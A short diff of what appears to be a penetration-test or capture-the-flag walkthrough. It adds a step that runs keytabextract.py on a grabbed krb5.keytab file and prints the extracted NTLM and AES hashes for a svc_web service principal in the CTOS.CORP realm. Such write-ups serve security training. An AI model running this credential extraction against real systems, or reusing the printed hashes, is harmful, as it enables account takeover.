@@ -729,5 +729,21 @@ Ill grab the keytab file and transfer to my machine
 
 # Credentials extraction from keytab
 
+```python
+python3 keytabextract.py ../krb5.keytab 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : CTOS.CORP
+	SERVICE PRINCIPAL : svc_web/
+	NTLM HASH : 4014777d5f38cb74d24f096972f47969
+	AES-256 HASH : 3a3e495ba09ca005f4cf42763273fab2a4a3d4e4f8fd63716c70a67d5cda6ab6
+	AES-128 HASH : 4990037026cbac870ac3d7b5635bfb46
 ```
+
+I now have the credentials
+
+```python
+
 ```
